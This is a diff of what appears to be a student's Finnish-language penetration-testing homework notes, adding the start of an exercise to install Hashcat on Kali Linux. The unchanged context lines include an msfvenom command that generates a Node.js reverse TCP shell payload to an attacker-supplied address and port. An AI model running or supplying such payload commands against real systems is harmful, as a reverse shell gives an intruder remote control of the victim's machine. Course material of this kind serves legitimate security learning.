@@ -39,6 +39,13 @@
   - ``msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)``
   - minulle on epäselvää, missä tilanteessa tätä voitaisiin hyödyntää?
 
+## a) Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana.
+
+Kali virtuaalikoneella:
+
+    sudo apt update
+    sudo apt install hashcat    # tullut Kalin mukana, mutta todentaa myös hashcatin olevan uusin versio
+
 
 
 ## Lähteet
